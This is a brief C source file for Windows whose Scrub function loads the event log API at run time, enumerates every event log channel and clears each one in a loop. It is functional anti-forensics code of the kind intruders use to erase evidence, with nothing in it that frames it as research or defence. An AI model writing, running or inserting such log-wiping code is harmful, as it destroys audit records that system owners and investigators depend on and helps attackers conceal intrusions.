#include <windows.h>

typedef HANDLE (WINAPI *OpenEnum_t)(HANDLE, DWORD);
typedef BOOL (WINAPI *Next_t)(HANDLE, DWORD, LPWSTR, PDWORD);
typedef BOOL (WINAPI *Clear_t)(HANDLE, LPCWSTR, LPCWSTR, DWORD);

void Scrub()
{
    HMODULE m = LoadLibraryW(L"wevtapi.dll");
    OpenEnum_t openEnum = (OpenEnum_t)GetProcAddress(m, "EvtOpenChannelEnum");
    Next_t nextPath = (Next_t)GetProcAddress(m, "EvtNextChannelPath");
    Clear_t wipe = (Clear_t)GetProcAddress(m, "EvtClearLog");
    WCHAR name[512]; DWORD got;
    HANDLE h = openEnum(NULL, 0);
    while (nextPath(h, 512, name, &got))
        wipe(NULL, name, NULL, 0);
}
